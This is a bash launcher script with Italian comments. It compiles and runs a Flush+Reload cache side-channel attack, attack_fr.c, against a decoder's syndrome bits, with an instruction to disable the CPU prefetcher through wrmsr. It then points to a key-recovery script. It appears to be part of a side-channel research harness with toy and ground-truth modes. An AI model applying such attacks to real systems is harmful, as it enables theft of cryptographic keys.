#!/usr/bin/env bash
# run_fr.sh - Milestone 1: oracolo cache REALE via Flush+Reload su syndrome_bits.
# Gemello di run.sh ma usa attack_fr.c (misura vera invece del log simulato).
#
# Uso:  ./run_fr.sh [bit|set] [seed] [line]
# Env:  CC (cc) MARCH (x86-64-v3) TOY (1=istanza toy) THRESH (130) CPU (core pin)
#
# IMPORTANTE prima di lanciare, sul core che usi:
#   wrmsr -p <CPU> 0x1a4 0xf     # prefetcher OFF (altrimenti falsi positivi)
set -euo pipefail
GRAN_ARG="${1:-set}"; SEED="${2:-1}"; LINE_ARG="${3:-64}"
case "$GRAN_ARG" in bit) GRAN_ENV="";; set) GRAN_ENV="set";; *) echo "usa bit|set">&2; exit 1;; esac
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"; ROOT="$(cd "$HERE/../.." && pwd)"
CC="${CC:-cc}"; MARCH="${MARCH:-x86-64-v3}"; THRESH="${THRESH:-130}"; CPU="${CPU:-}"
INC=(-I"$ROOT/include" -I"$ROOT/src/core" -I"$ROOT/harness/common" -I"$ROOT/src/decoders/plain")
TOY="${TOY:-}"
if [ -n "$TOY" ] && [ "$TOY" != "0" ]; then DTOY=(-DTOY); BUILD="$HERE/build/fr_toy"; TAG=toy
else DTOY=(); BUILD="$HERE/build/fr_real"; TAG=real; fi
mkdir -p "$BUILD"
echo ">> compilo attack_fr.c [istanza=$TAG]"
"$CC" -O2 -march="$MARCH" "${DTOY[@]}" "${INC[@]}" -include "$ROOT/src/decoders/plain/decoder.c" -c "$HERE/attack_fr.c" -o "$BUILD/attack_fr.o"
"$CC" -O2 -march="$MARCH" "${DTOY[@]}" "${INC[@]}" -c "$ROOT/harness/common/instance.c" -o "$BUILD/instance.o"
"$CC" "$BUILD/attack_fr.o" "$BUILD/instance.o" -o "$BUILD/attack_fr" -lm
RUN=("$BUILD/attack_fr" truth.txt "$SEED"); [ -n "$CPU" ] && RUN=(taskset -c "$CPU" "${RUN[@]}")
echo ">> eseguo (gran=$GRAN_ARG line=$LINE_ARG seed=$SEED thresh=$THRESH cpu=${CPU:-any})"
GRAN="$GRAN_ENV" LINE="$LINE_ARG" THRESH="$THRESH" "${RUN[@]}" > trace.txt
echo; echo "trace.txt ($(grep -vc '^#' trace.txt) iterazioni) + truth.txt pronti"
echo "key recovery:  python3 $HERE/key-recovery.py truth.txt < trace.txt"
